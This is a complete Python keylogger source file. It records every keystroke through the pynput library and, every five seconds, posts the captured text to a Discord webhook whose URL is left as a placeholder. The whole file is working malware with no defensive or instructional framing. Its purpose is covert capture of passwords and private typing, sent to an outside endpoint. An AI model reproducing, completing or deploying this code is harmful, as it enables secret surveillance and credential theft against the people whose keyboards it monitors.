import os
import json
import threading
import requests
from pynput import keyboard

WEBHOOK_URL = "DISCORD-WEBHOOK-OR-WHATEVER"
LOG_FILE = os.path.join(os.getenv("APPDATA"), "keylogger_logs.txt")

class Keylogger:
    def __init__(self):
        self.log = ""
        self.running = True
        self.shift_pressed = False
        self.key_map = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "<BKSP>",
            keyboard.Key.ctrl: "<CTRL>",
            keyboard.Key.alt: "<ALT>",
            keyboard.Key.esc: "<ESC>",
            keyboard.Key.insert: "<INS>",
            keyboard.Key.home: "<HOME>",
            keyboard.Key.page_up: "<PGUP>",
            keyboard.Key.page_down: "<PGDN>",
            keyboard.Key.end: "<END>",
            keyboard.Key.print_screen: "<PRTSC>",
            keyboard.Key.pause: "<PAUSE>"
        }

    def send_to_discord(self):
        if not self.log:
            return

        payload = {
            "username": "Keylogger",
            "embeds": [{
                "title": "Keylogger Report",
                "description": f"```{self.log[-1500:]}```",
                "color": 16711680,
                "footer": {"text": "Key Monitoring"}
            }]
        }

        try:
            response = requests.post(
                WEBHOOK_URL,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            if response.status_code == 204:
                self.log = ""
        except requests.exceptions.RequestException:
            pass

    def on_press(self, key):
        if key == keyboard.Key.shift:
            if not self.shift_pressed:
                self.log += "<SHIFT>"
                self.shift_pressed = True
        else:
            try:
                self.log += key.char
            except AttributeError:
                self.log += self.key_map.get(key, f"[{key.name}]")

    def on_release(self, key):
        if key == keyboard.Key.shift:
            self.shift_pressed = False

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            while self.running:
                self.send_to_discord()
                threading.Event().wait(5)

if __name__ == "__main__":
    Keylogger = Keylogger()
    Keylogger.start()